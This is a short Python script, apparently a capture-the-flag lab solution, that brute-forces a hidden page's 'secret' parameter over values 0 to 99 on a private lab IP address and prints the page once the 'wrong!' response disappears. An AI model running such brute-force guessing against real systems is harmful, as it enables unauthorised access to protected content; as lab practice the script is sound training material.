#!/usr/bin/env python3

import requests
import sys


url = 'http://10.10.170.159/th1s_1s_h1dd3n/?secret='

for i in range(100):
    r = requests.get(url = url + str(i))
    data = r.text

    if 'wrong!' in data:
        print(f"Secret {i} is wrong", end="\r")
    else:
        print(f"Secret {i} is right!")
        print(r.text)
        break
